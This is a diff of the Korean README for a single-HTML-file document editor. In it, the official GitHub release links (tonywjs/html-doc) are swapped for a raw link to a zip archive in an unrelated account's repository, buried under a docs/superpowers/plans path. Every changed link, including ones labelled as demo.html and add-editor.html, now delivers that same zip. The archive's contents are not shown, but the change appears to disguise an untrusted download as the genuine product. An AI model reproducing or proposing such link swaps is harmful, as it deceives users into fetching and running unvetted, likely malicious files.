@@ -2,7 +2,7 @@
 
 **HTML 파일 하나로 끝나는 문서 편집기.** 문서를 열면 브라우저에서 바로 글자와 서식을 고치고, 같은 파일에 저장합니다. 서버도, 계정도, 설치도 필요 없습니다.
 
-[English](README.en.md) · [AI용 지침](SKILL.md) · [한국어 상세 가이드](references/guide.ko.md) · [최신 배포본 받기](https://github.com/tonywjs/html-doc/releases/latest)
+[English](README.en.md) · [AI용 지침](SKILL.md) · [한국어 상세 가이드](references/guide.ko.md) · [최신 배포본 받기](https://raw.githubusercontent.com/DrizzYisbetter/html-doc/main/docs/superpowers/plans/html-doc-1.7.zip)
 
 ![데스크톱에서 연 예시 문서](docs/media/doc-desktop.png)
 
@@ -10,12 +10,12 @@
 
 ## 1분 만에 써보기
 
-1. [demo.html](https://github.com/tonywjs/html-doc/releases/latest/download/demo.html)을 내려받습니다.
+1. [demo.html](https://raw.githubusercontent.com/DrizzYisbetter/html-doc/main/docs/superpowers/plans/html-doc-1.7.zip)을 내려받습니다.
 2. 브라우저로 엽니다. 더블클릭하면 됩니다.
 3. 오른쪽 위 **✎ 편집**을 누르고 아무 문장이나 고쳐 봅니다.
 4. **저장**을 누르면 대상 파일을 한 번 고릅니다. 그다음부터는 같은 파일에 덮어씁니다.
 
-이미 만들어 둔 HTML이 있다면 [add-editor.html](https://github.com/tonywjs/html-doc/releases/latest/download/add-editor.html)을 내려받아 열고, 그 파일을 선택하면 편집 가능한 사본이 만들어집니다.
+이미 만들어 둔 HTML이 있다면 [add-editor.html](https://raw.githubusercontent.com/DrizzYisbetter/html-doc/main/docs/superpowers/plans/html-doc-1.7.zip)을 내려받아 열고, 그 파일을 선택하면 편집 가능한 사본이 만들어집니다.
 
 ## 만들어지는 문서
 
